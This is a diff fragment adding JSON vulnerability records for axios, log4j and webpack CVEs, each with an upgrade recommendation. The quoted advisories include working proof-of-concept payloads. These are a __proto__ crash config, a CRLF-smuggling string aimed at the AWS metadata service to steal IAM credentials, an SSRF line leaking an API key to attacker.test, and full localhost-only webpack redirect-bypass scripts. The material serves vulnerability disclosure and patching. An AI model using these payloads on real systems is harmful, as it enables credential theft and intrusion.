+      "description": "Axios is Vulnerable to Denial of Service via __proto__ Key in mergeConfig. # Denial of Service via **proto** Key in mergeConfig\n\n### Summary\n\nThe `mergeConfig` function in axios crashes with a TypeError when processing configuration objects containing `__proto__` as an own property. An attacker can trigger this by providing a malicious configuration object created via `JSON.parse()`, causing complete denial of service.\n\n### Details\n\nThe vulnerability exists in `lib/core/mergeConfig.js` at lines 98-101:\n\n```javascript\nutils.forEach(Object.keys({ ...config1, ...config2 }), function computeConfigValue(prop) {\n  const merge = mergeMap[prop] || mergeDeepProperties;\n  const configValue = merge(config1[prop], config2[prop], prop);\n  (utils.isUndefined(configValue) \u0026amp;\u0026amp; merge !== mergeDirectKeys) || (config[prop] = configValue);\n});\n```\n\nWhen `prop` is `\u0026#39;__proto__\u0026#39;`:\n\n1. `JSON.parse(\u0026#39;{\u0026#34;__proto__\u0026#34;: {...}}\u0026#39;)` creates an object with `__proto__` as an own enumerable property\n2. `Object.keys()` includes `\u0026#39;__proto__\u0026#39;` in the iteration\n3. `mergeMap[\u0026#39;__proto__\u0026#39;]` performs prototype chain lookup, returning `Object.prototype` (truthy object)\n4. The expression `mergeMap[prop] || mergeDeepProperties` evaluates to `Object.prototype`\n5. `Object.prototype(...)` throws `TypeError: merge is not a function`\n\nThe `mergeConfig` function is called by:\n\n- `Axios._request()` at `lib/core/Axios.js:75`\n- `Axios.getUri()` at `lib/core/Axios.js:201`\n- All HTTP method shortcuts (`get`, `post`, etc.) at `lib/core/Axios.js:211,224`\n\n### PoC\n\n```javascript\nimport axios from \u0026#34;axios\u0026#34;;\n\nconst maliciousConfig = JSON.parse(\u0026#39;{\u0026#34;__proto__\u0026#34;: {\u0026#34;x\u0026#34;: 1}}\u0026#39;);\nawait axios.get(\u0026#34;https://httpbin.org/get\u0026#34;, maliciousConfig);\n```\n\n**Reproduction steps:**\n\n1. Clone axios repository or `npm install axios`\n2. Create file `poc.mjs` with the code above\n3. Run: `node poc.mjs`\n4. Observe the TypeError crash\n\n**Verified output (axios 1.13.4):**\n\n```\nTypeError: merge is not a function\n    at computeConfigValue (lib/core/mergeConfig.js:100:25)\n    at Object.forEach (lib/utils.js:280:10)\n    at mergeConfig (lib/core/mergeConfig.js:98:9)\n```\n\n**Control tests performed:**\n| Test | Config | Result |\n|------|--------|--------|\n| Normal config | `{\u0026#34;timeout\u0026#34;: 5000}` | SUCCESS |\n| Malicious config | `JSON.parse(\u0026#39;{\u0026#34;__proto__\u0026#34;: {\u0026#34;x\u0026#34;: 1}}\u0026#39;)` | **CRASH** |\n| Nested object | `{\u0026#34;headers\u0026#34;: {\u0026#34;X-Test\u0026#34;: \u0026#34;value\u0026#34;}}` | SUCCESS |\n\n**Attack scenario:**\nAn application that accepts user input, parses it with `JSON.parse()`, and passes it to axios configuration will crash when receiving the payload `{\u0026#34;__proto__\u0026#34;: {\u0026#34;x\u0026#34;: 1}}`.\n\n### Impact\n\n**Denial of Service** - Any application using axios that processes user-controlled JSON and passes it to axios configuration methods is vulnerable. The application will crash when processing the malicious payload.\n\nAffected environments:\n\n- Node.js servers using axios for HTTP requests\n- Any backend that passes parsed JSON to axios configuration\n\nThis is NOT prototype pollution - the application crashes before any assignment occurs.",
+      "severity": "MEDIUM",
+      "cvss_score": 4,
+      "affected_package": "axios",
+      "recommendation": "Upgrade axios from 0.21.1 to 0.30.3 to fix CVE-2026-25639. Run: npm install axios@0.30.3.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2021-3749",
+      "published": "2021-09-01T18:23:02Z",
+      "lastModified": "2023-11-08T04:06:18.328201Z",
+      "current_version": "0.21.1",
+      "fixed_version": "0.21.2",
+      "description": "axios Inefficient Regular Expression Complexity vulnerability. axios before v0.21.2 is vulnerable to Inefficient Regular Expression Complexity.",
+      "severity": "MEDIUM",
+      "cvss_score": 4,
+      "affected_package": "axios",
+      "recommendation": "Upgrade axios from 0.21.1 to 0.21.2 to fix CVE-2021-3749. Run: npm install axios@0.21.2.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2026-40175",
+      "published": "2026-04-10T19:47:16Z",
+      "lastModified": "2026-04-16T22:29:17.481541503Z",
+      "current_version": "0.21.1",
+      "fixed_version": "0.31.0",
+      "description": "Axios has Unrestricted Cloud Metadata Exfiltration via Header Injection Chain. # Vulnerability Disclosure: Unrestricted Cloud Metadata Exfiltration via Header Injection Chain\n\n## Summary\nThe Axios library is vulnerable to a specific \u0026#34;Gadget\u0026#34; attack chain that allows **Prototype Pollution** in any third-party dependency to be escalated into **Remote Code Execution (RCE)** or **Full Cloud Compromise** (via AWS IMDSv2 bypass).\n\nWhile Axios patches exist for *preventing check* pollution, the library remains vulnerable to *being used* as a gadget when pollution occurs elsewhere. This is due to a lack of HTTP Header Sanitization (CWE-113) combined with default SSRF capabilities.\n\n**Severity**: Critical (CVSS 9.9)\n**Affected Versions**: All versions (v0.x - v1.x)\n**Vulnerable Component**: `lib/adapters/http.js` (Header Processing)\n\n## Usage of \u0026#34;Helper\u0026#34; Vulnerabilities\nThis vulnerability is unique because it requires **Zero Direct User Input**.\nIf an attacker can pollute `Object.prototype` via *any* other library in the stack (e.g., `qs`, `minimist`, `ini`, `body-parser`), Axios will automatically pick up the polluted properties during its config merge.\n\nBecause Axios does not sanitise these merged header values for CRLF (`\\r\\n`) characters, the polluted property becomes a **Request Smuggling** payload.\n\n## Proof of Concept\n\n### 1. The Setup (Simulated Pollution)\nImagine a scenario where a known vulnerability exists in a query parser. The attacker sends a payload that sets:\n```javascript\nObject.prototype[\u0026#39;x-amz-target\u0026#39;] = \u0026#34;dummy\\r\\n\\r\\nPUT /latest/api/token HTTP/1.1\\r\\nHost: 169.254.169.254\\r\\nX-aws-ec2-metadata-token-ttl-seconds: 21600\\r\\n\\r\\nGET /ignore\u0026#34;;\n```\n\n### 2. The Gadget Trigger (Safe Code)\nThe application makes a completely safe, hardcoded request:\n```javascript\n// This looks safe to the developer\nawait axios.get(\u0026#39;https://analytics.internal/pings\u0026#39;); \n```\n\n### 3. The Execution\nAxios merges the prototype property `x-amz-target` into the request headers. It then writes the header value directly to the socket without validation.\n\n**Resulting HTTP traffic:**\n```http\nGET /pings HTTP/1.1\nHost: analytics.internal\nx-amz-target: dummy\n\nPUT /latest/api/token HTTP/1.1\nHost: 169.254.169.254\nX-aws-ec2-metadata-token-ttl-seconds: 21600\n\nGET /ignore HTTP/1.1\n...\n```\n\n### 4. The Impact (IMDSv2 Bypass)\nThe \u0026#34;Smuggled\u0026#34; second request is a valid `PUT` request to the AWS Metadata Service. It includes the required `X-aws-ec2-metadata-token-ttl-seconds` header (which a normal SSRF cannot send).\nThe Metadata Service returns a session token, allowing the attacker to steal IAM credentials and compromise the cloud account.\n\n## Impact Analysis\n-   **Security Control Bypass**: Defeats AWS IMDSv2 (Session Tokens).\n-   **Authentication Bypass**: Can inject headers (`Cookie`, `Authorization`) to pivot into internal administrative panels.\n-   **Cache Poisoning**: Can inject `Host` headers to poison shared caches.\n\n## Recommended Fix\nValidate all header values in `lib/adapters/http.js` and `xhr.js` before passing them to the underlying request function.\n\n**Patch Suggestion:**\n```javascript\n// In lib/adapters/http.js\nutils.forEach(requestHeaders, function setRequestHeader(val, key) {\n  if (/[\\r\\n]/.test(val)) {\n    throw new Error(\u0026#39;Security: Header value contains invalid characters\u0026#39;);\n  }\n  // ... proceed to set header\n});\n```\n\n## References\n-   **OWASP**: CRLF Injection (CWE-113)\n\nThis report was generated as part of a security audit of the Axios library.",
+      "severity": "MEDIUM",
+      "cvss_score": 4,
+      "affected_package": "axios",
+      "recommendation": "Upgrade axios from 0.21.1 to 0.31.0 to fix CVE-2026-40175. Run: npm install axios@0.31.0.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2025-27152",
+      "published": "2025-03-07T15:16:00Z",
+      "lastModified": "2026-02-04T03:30:49.527969Z",
+      "current_version": "0.21.1",
+      "fixed_version": "0.30.0",
+      "description": "axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL. ### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \u0026#34;axios\u0026#34;;\n\nconst internalAPIClient = axios.create({\n  baseURL: \u0026#34;http://example.test/api/v1/users/\u0026#34;,\n  headers: {\n    \u0026#34;X-API-KEY\u0026#34;: \u0026#34;1234567890\u0026#34;,\n  },\n});\n\n// const userId = \u0026#34;123\u0026#34;;\nconst userId = \u0026#34;http://attacker.test/\u0026#34;;\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \u0026#34;this is server1\u0026#34; \u0026gt; /tmp/server1/index.html \necho \u0026#34;this is server2\u0026#34; \u0026gt; /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 \u0026amp;\npython -m http.server -d /tmp/server2 10002 \u0026amp;\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \u0026#34;axios\u0026#34;;\nconst client = axios.create({ baseURL: \u0026#34;http://localhost:10001/\u0026#34; });\nconst response = await client.get(\u0026#34;http://localhost:10002/\u0026#34;);\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",
+      "severity": "HIGH",
+      "cvss_score": 7.5,
+      "affected_package": "axios",
+      "recommendation": "Upgrade axios from 0.21.1 to 0.30.0 to fix CVE-2025-27152. Run: npm install axios@0.30.0.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2023-45857",
+      "published": "2023-11-08T21:30:37Z",
+      "lastModified": "2026-02-04T02:41:22.966638Z",
+      "current_version": "0.21.1",
+      "fixed_version": "0.28.0",
+      "description": "Axios Cross-Site Request Forgery Vulnerability. An issue discovered in Axios 0.8.1 through 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information.",
+      "severity": "LOW",
+      "cvss_score": 3,
+      "affected_package": "axios",
+      "recommendation": "Upgrade axios from 0.21.1 to 0.28.0 to fix CVE-2023-45857. Run: npm install axios@0.28.0.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2021-45046",
+      "published": "2021-12-14T18:01:28Z",
+      "lastModified": "2025-10-22T19:37:53.742023Z",
+      "current_version": "${log4j.version}",
+      "description": "Incomplete fix for Apache Log4j vulnerability. # Impact\n\nThe fix to address [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allow attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in a remote code execution (RCE) attack. \n\n## Affected packages\nOnly the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.\n\n# Mitigation\n\nLog4j 2.16.0 fixes this issue by removing support for message lookup patterns and disabling JNDI functionality by default. This issue can be mitigated in prior releases (\u0026lt; 2.16.0) by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class).\n\nLog4j 2.15.0 restricts JNDI LDAP lookups to localhost by default. Note that previous mitigations involving configuration such as to set the system property `log4j2.formatMsgNoLookups` to `true` do NOT mitigate this specific vulnerability.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "org.apache.logging.log4j:log4j-core",
+      "recommendation": "No patched version is available for org.apache.logging.log4j:log4j-core (CVE-2021-45046). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2021-45105",
+      "published": "2021-12-18T18:00:07Z",
+      "lastModified": "2025-05-09T13:12:54.089856Z",
+      "current_version": "${log4j.version}",
+      "description": "Apache Log4j2 vulnerable to Improper Input Validation and Uncontrolled Recursion. Apache Log4j2 versions 2.0-alpha1 through 2.16.0 (excluding 2.12.3) did not protect from uncontrolled recursion from self-referential lookups. This allows an attacker with control over Thread Context Map data to cause a denial of service when a crafted string is interpreted. This issue was fixed in Log4j 2.17.0 and 2.12.3.\n\n\n# Affected packages\nOnly the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.",
+      "severity": "MEDIUM",
+      "cvss_score": 4,
+      "affected_package": "org.apache.logging.log4j:log4j-core",
+      "recommendation": "No fixed version for org.apache.logging.log4j:log4j-core (CVE-2021-45105). Limit exposure, avoid vulnerable functionality, and monitor for updates.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2020-9488",
+      "published": "2020-06-05T14:15:51Z",
+      "lastModified": "2024-03-13T05:32:08.046905Z",
+      "current_version": "${log4j.version}",
+      "description": "Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. Improper validation of certificate with host mismatch in Apache Log4j SMTP appender prior to version 2.13.2. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.",
+      "severity": "LOW",
+      "cvss_score": 3,
+      "affected_package": "org.apache.logging.log4j:log4j-core",
+      "recommendation": "Monitor org.apache.logging.log4j:log4j-core (CVE-2020-9488) for updates and upgrade when a fix becomes available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2025-68157",
+      "published": "2026-02-05T18:35:28Z",
+      "lastModified": "2026-02-14T01:58:47.151266Z",
+      "current_version": "5.50.0",
+      "fixed_version": "5.104.0",
+      "description": "webpack buildHttp HttpUriPlugin allowedUris bypass via HTTP redirects → SSRF + cache persistence. ### Summary\nWhen `experiments.buildHttp` is enabled, webpack’s HTTP(S) resolver (`HttpUriPlugin`) enforces `allowedUris` only for the **initial** URL, but **does not re-validate `allowedUris` after following HTTP 30x redirects**. As a result, an import that appears restricted to a trusted allow-list can be redirected to **HTTP(S) URLs outside the allow-list**. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion in build outputs** (redirected content is treated as module source and bundled). In my reproduction, the internal response is also persisted in the buildHttp cache.\n\n### Details\nIn the HTTP scheme resolver, the allow-list check (`allowedUris`) is performed when metadata/info is created for the original request (via `getInfo()`), but the content-fetch path follows redirects by resolving the `Location` URL without re-checking whether the redirected URL is within `allowedUris`.\n\nPractical consequence: if an “allowed” host/path can return a 302 (or has an open redirect), it can point to an external URL or an internal-only URL (SSRF). The redirected response is consumed as module content, bundled, and can be cached. If the redirect target is attacker-controlled, this can potentially result in attacker-controlled JavaScript being bundled and later executed when the resulting bundle runs.\n\n**Figure 1 (evidence screenshot):** left pane shows the allowed host issuing a 302 redirect to `http://127.0.0.1:9100/secret.js`; right pane shows the build output confirming allow-list bypass and that the secret appears in the bundle and buildHttp cache.\n\n\u0026lt;img width=\u0026#34;1648\u0026#34; height=\u0026#34;461\u0026#34; alt=\u0026#34;image\u0026#34; src=\u0026#34;https://github.com/user-attachments/assets/bb25f3ff-1919-49f9-951b-ad50bf0c7524\u0026#34; /\u0026gt;\n\n\n### PoC\nThis PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely.\n\n#### 1) Setup\n```bash\nmkdir split-ssrf-poc \u0026amp;\u0026amp; cd split-ssrf-poc\nnpm init -y\nnpm i -D webpack webpack-cli\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\u0026#34;use strict\u0026#34;;\n\nconst http = require(\u0026#34;http\u0026#34;);\nconst url = require(\u0026#34;url\u0026#34;);\n\nconst allowedPort = 9000;\nconst internalPort = 9100;\n\nconst internalUrlDefault = `http://127.0.0.1:${internalPort}/secret.js`;\nconst secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;\nconst internalPayload =\n  `export const secret = ${JSON.stringify(secret)};\\n` +\n  `export default \u0026#34;ok\u0026#34;;\\n`;\n\nfunction start(port, handler) {\n  return new Promise(resolve =\u0026gt; {\n    const s = http.createServer(handler);\n    s.listen(port, \u0026#34;127.0.0.1\u0026#34;, () =\u0026gt; resolve(s));\n  });\n}\n\n(async () =\u0026gt; {\n  // Internal-only service (SSRF target)\n  await start(internalPort, (req, res) =\u0026gt; {\n    if (req.url === \u0026#34;/secret.js\u0026#34;) {\n      res.statusCode = 200;\n      res.setHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/javascript; charset=utf-8\u0026#34;);\n      res.end(internalPayload);\n      console.log(`[internal] 200 /secret.js served (secret=${secret})`);\n      return;\n    }\n    res.statusCode = 404;\n    res.end(\u0026#34;not found\u0026#34;);\n  });\n\n  // Allowed host (redirector)\n  await start(allowedPort, (req, res) =\u0026gt; {\n    const parsed = url.parse(req.url, true);\n\n    if (parsed.pathname === \u0026#34;/redirect.js\u0026#34;) {\n      const to = parsed.query.to || internalUrlDefault;\n\n      // Safety guard: only allow redirecting to localhost internal service in this PoC\n      if (!to.startsWith(`http://127.0.0.1:${internalPort}/`)) {\n        res.statusCode = 400;\n        res.end(\u0026#34;to must be internal-only in this PoC\u0026#34;);\n        console.log(`[allowed] blocked redirect to: ${to}`);\n        return;\n      }\n\n      res.statusCode = 302;\n      res.setHeader(\u0026#34;Location\u0026#34;, to);\n      res.end(\u0026#34;redirecting\u0026#34;);\n      console.log(`[allowed] 302 /redirect.js -\u0026gt; ${to}`);\n      return;\n    }\n\n    res.statusCode = 404;\n    res.end(\u0026#34;not found\u0026#34;);\n  });\n\n  console.log(`\\nServer running:`);\n  console.log(`- allowed host:  http://127.0.0.1:${allowedPort}/redirect.js`);\n  console.log(`- internal-only: http://127.0.0.1:${internalPort}/secret.js`);\n})();\n```\n\n#### 3) Create attacker.js\n```js\n#!/usr/bin/env node\n\u0026#34;use strict\u0026#34;;\n\nconst path = require(\u0026#34;path\u0026#34;);\nconst os = require(\u0026#34;os\u0026#34;);\nconst fs = require(\u0026#34;fs/promises\u0026#34;);\nconst webpack = require(\u0026#34;webpack\u0026#34;);\nconst webpackPkg = require(\u0026#34;webpack/package.json\u0026#34;);\n\nconst allowedPort = 9000;\nconst internalPort = 9100;\n\nconst allowedBase = `http://127.0.0.1:${allowedPort}/`;\nconst internalTarget = `http://127.0.0.1:${internalPort}/secret.js`;\nconst entryUrl = `${allowedBase}redirect.js?to=${encodeURIComponent(internalTarget)}`;\n\nasync function walk(dir) {\n  const out = [];\n  const items = await fs.readdir(dir, { withFileTypes: true });\n  for (const it of items) {\n    const p = path.join(dir, it.name);\n    if (it.isDirectory()) out.push(...await walk(p));\n    else if (it.isFile()) out.push(p);\n  }\n  return out;\n}\n\nasync function fileContains(f, needle) {\n  try {\n    const buf = await fs.readFile(f);\n    return buf.toString(\u0026#34;utf8\u0026#34;).includes(needle) || buf.toString(\u0026#34;latin1\u0026#34;).includes(needle);\n  } catch {\n    return false;\n  }\n}\n\nasync function findInFiles(files, needle) {\n  const hits = [];\n  for (const f of files) if (await fileContains(f, needle)) hits.push(f);\n  return hits;\n}\n\nconst fmtBool = b =\u0026gt; (b ? \u0026#34;✅\u0026#34; : \u0026#34;❌\u0026#34;);\n\n(async () =\u0026gt; {\n  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), \u0026#34;webpack-attacker-\u0026#34;));\n  const srcDir = path.join(tmp, \u0026#34;src\u0026#34;);\n  const distDir = path.join(tmp, \u0026#34;dist\u0026#34;);\n  const cacheDir = path.join(tmp, \u0026#34;.buildHttp-cache\u0026#34;);\n  const lockfile = path.join(tmp, \u0026#34;webpack.lock\u0026#34;);\n  const bundlePath = path.join(distDir, \u0026#34;bundle.js\u0026#34;);\n\n  await fs.mkdir(srcDir, { recursive: true });\n  await fs.mkdir(distDir, { recursive: true });\n\n  await fs.writeFile(\n    path.join(srcDir, \u0026#34;index.js\u0026#34;),\n    `import { secret } from ${JSON.stringify(entryUrl)};\nconsole.log(\u0026#34;LEAKED_SECRET:\u0026#34;, secret);\nexport default secret;\n`\n  );\n\n  const config = {\n    context: tmp,\n    mode: \u0026#34;development\u0026#34;,\n    entry: \u0026#34;./src/index.js\u0026#34;,\n    output: { path: distDir, filename: \u0026#34;bundle.js\u0026#34; },\n    experiments: {\n      buildHttp: {\n        allowedUris: [allowedBase],\n        cacheLocation: cacheDir,\n        lockfileLocation: lockfile,\n        upgrade: true\n      }\n    }\n  };\n\n  const compiler = webpack(config);\n\n  compiler.run(async (err, stats) =\u0026gt; {\n    try {\n      if (err) throw err;\n\n      const info = stats.toJson({ all: false, errors: true, warnings: true });\n      if (stats.hasErrors()) {\n        console.error(info.errors);\n        process.exitCode = 1;\n        return;\n      }\n\n      const bundle = await fs.readFile(bundlePath, \u0026#34;utf8\u0026#34;);\n      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);\n      const secret = m ? m[0] : null;\n\n      console.log(\u0026#34;\\n[ATTACKER RESULT]\u0026#34;);\n      console.log(`- webpack version: ${webpackPkg.version}`);\n      console.log(`- node version: ${process.version}`);\n      console.log(`- allowedUris: ${JSON.stringify([allowedBase])}`);\n      console.log(`- imported URL (allowed only): ${entryUrl}`);\n      console.log(`- temp dir: ${tmp}`);\n      console.log(`- lockfile: ${lockfile}`);\n      console.log(`- cacheDir: ${cacheDir}`);\n      console.log(`- bundle:   ${bundlePath}`);\n\n      if (!secret) {\n        console.log(\u0026#34;\\n[SECURITY SUMMARY]\u0026#34;);\n        console.log(`- bundle contains internal secret marker: ${fmtBool(false)}`);\n        return;\n      }\n\n      const lockHit = await fileContains(lockfile, secret);\n\n      let cacheFiles = [];\n      try { cacheFiles = await walk(cacheDir); } catch { cacheFiles = []; }\n      const cacheHit = cacheFiles.length ? (await findInFiles(cacheFiles, secret)).length \u0026gt; 0 : false;\n\n      const allTmpFiles = await walk(tmp);\n      const allHits = await findInFiles(allTmpFiles, secret);\n\n      console.log(`\\n- extracted secret marker from bundle: ${secret}`);\n\n      console.log(\u0026#34;\\n[SECURITY SUMMARY]\u0026#34;);\n      console.log(`- Redirect allow-list bypass: ${fmtBool(true)} (imported allowed URL, but internal target was fetched)`);\n      console.log(`- Internal target (SSRF-like): ${internalTarget}`);\n      console.log(`- EXPECTED: internal target should be BLOCKED by allowedUris`);\n      console.log(`- ACTUAL: internal content treated as module and bundled`);\n\n      console.log(\u0026#34;\\n[EVIDENCE CHECKLIST]\u0026#34;);\n      console.log(`- bundle contains secret:   ${fmtBool(true)}`);\n      console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);\n      console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);\n\n      console.log(\u0026#34;\\n[PERSISTENCE CHECK] files containing secret\u0026#34;);\n      for (const f of allHits.slice(0, 30)) console.log(`- ${f}`);\n      if (allHits.length \u0026gt; 30) console.log(`- ... and ${allHits.length - 30} more`);\n    } catch (e) {\n      console.error(e);\n      process.exitCode = 1;\n    } finally {\n      compiler.close(() =\u0026gt; {});\n    }\n  });\n})();\n```\n\n#### 4) Run\nTerminal A:\n```bash\nnode server.js\n```\n\nTerminal B:\n```bash\nnode attacker.js\n```\n\n#### 5) Expected\n\nExpected: Redirect target should be rejected if not in allowedUris (only http://127.0.0.1:9000/ is allowed).\n\n### Impact\n\nVulnerability class: Policy/allow-list bypass leading to SSRF behavior at build time and untrusted content inclusion in build outputs (and potentially bundling of attacker-controlled JavaScript if the redirect target is attacker-controlled).\n\nWho is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary (to restrict remote module fetching). In such environments, an attacker who can influence imported URLs (e.g., via source contribution, dependency manipulation, or configuration) and can cause an allowed endpoint to redirect can:\n\ntrigger network requests from the build machine to internal-only services (SSRF behavior),\n\ncause content from outside the allow-list to be bundled into build outputs,\n\nand cause fetched responses to persist in build artifacts (e.g., buildHttp cache), increasing the risk of later exfiltration.",
+      "severity": "MEDIUM",
+      "cvss_score": 4,
+      "affected_package": "webpack",
+      "recommendation": "Upgrade webpack from 5.50.0 to 5.104.0 to fix CVE-2025-68157. Run: npm install webpack@5.104.0.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2024-43788",
+      "published": "2024-08-27T19:50:40Z",
+      "lastModified": "2026-02-04T03:44:08.778030Z",
+      "current_version": "5.50.0",
+      "fixed_version": "5.94.0",
+      "description": "Webpack\u0026#39;s AutoPublicPathRuntimeModule has a DOM Clobbering Gadget that leads to XSS. ### Summary\n\nWe discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nWe found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.\n\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n\n#### Gadgets found in Webpack\n\nWe identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:\n\n```\n/******/ \t/* webpack/runtime/publicPath */\n/******/ \t(() =\u0026gt; {\n/******/ \t\tvar scriptUrl;\n/******/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \u0026#34;\u0026#34;;\n/******/ \t\tvar document = __webpack_require__.g.document;\n/******/ \t\tif (!scriptUrl \u0026amp;\u0026amp; document) {\n/******/ \t\t\tif (document.currentScript)\n/******/ \t\t\t\tscriptUrl = document.currentScript.src;\n/******/ \t\t\tif (!scriptUrl) {\n/******/ \t\t\t\tvar scripts = document.getElementsByTagName(\u0026#34;script\u0026#34;);\n/******/ \t\t\t\tif(scripts.length) {\n/******/ \t\t\t\t\tvar i = scripts.length - 1;\n/******/ \t\t\t\t\twhile (i \u0026gt; -1 \u0026amp;\u0026amp; (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t}\n/******/ \t\t// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n/******/ \t\t// or pass an empty string (\u0026#34;\u0026#34;) and set the __webpack_public_path__ variable from your code to use your own logic.\n/******/ \t\tif (!scriptUrl) throw new Error(\u0026#34;Automatic publicPath is not supported in this browser\u0026#34;);\n/******/ \t\tscriptUrl = scriptUrl.replace(/#.*$/, \u0026#34;\u0026#34;).replace(/\\?.*$/, \u0026#34;\u0026#34;).replace(/\\/[^\\/]+$/, \u0026#34;/\u0026#34;);\n/******/ \t\t__webpack_require__.p = scriptUrl;\n/******/ \t})();\n```\n\nHowever, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker\u0026#39;s domain. This could lead to arbitrary script loading from the attacker\u0026#39;s server, resulting in severe security risks.\n\n### PoC\n\nPlease note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.\n\nConsider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:\n\n```\n// entry.js\nimport(\u0026#39;./import1.js\u0026#39;)\n  .then(module =\u0026gt; {\n    module.hello();\n  })\n  .catch(err =\u0026gt; {\n    console.error(\u0026#39;Failed to load module\u0026#39;, err);\n  });\n```\n\n```\n// import1.js\nexport function hello () {\n  console.log(\u0026#39;Hello\u0026#39;);\n}\n```\n\nThe webpack.config.js is set up as 